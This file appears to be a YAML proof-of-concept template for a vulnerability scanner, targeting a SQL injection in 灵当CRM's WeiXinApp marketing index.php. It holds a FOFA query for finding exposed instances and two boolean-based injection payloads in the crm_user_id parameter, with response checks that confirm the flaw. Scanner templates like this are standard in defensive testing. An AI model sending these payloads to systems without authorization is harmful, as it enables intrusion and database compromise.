id: poc-yaml-51mis-crm-marketing-index-sqli
info:
  name: 灵当CRM系统index.php存在SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 灵当CRM
  fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php"
    && body="ldcrm.base.js")
requests:
- method: GET
  path: /crm/WeiXinApp/marketing/index.php?module=WxOrder&action=getOrderList&crm_user_id=1%20and%20if((select%20length((select%20123))=3),1,2*1e308)--+
  expression: "status_code == 200 && \ncontains(body,\"\\\"appname\\\"\") &&\ncontains(body,\"\
    \\\"search_reminds\\\"\") &&\ncontains(body,\"\\\"totalamounts\\\"\") &&\n!contains(body,\"\
    <\")\n"
- method: GET
  path: /crm/WeiXinApp/marketing/index.php?module=WxOrder&action=getOrderList&crm_user_id=1%20and%20if((select%20length((select%20123))=1),1,2*1e308)--+
  expression: "status_code == 200 && \ncontains(body,\"Fatal error\") &&\ncontains(body,\"\
    Uncaught Exception\") &&\ncontains(body,\"Stack trace\")\n"
variables: {}
transport: http
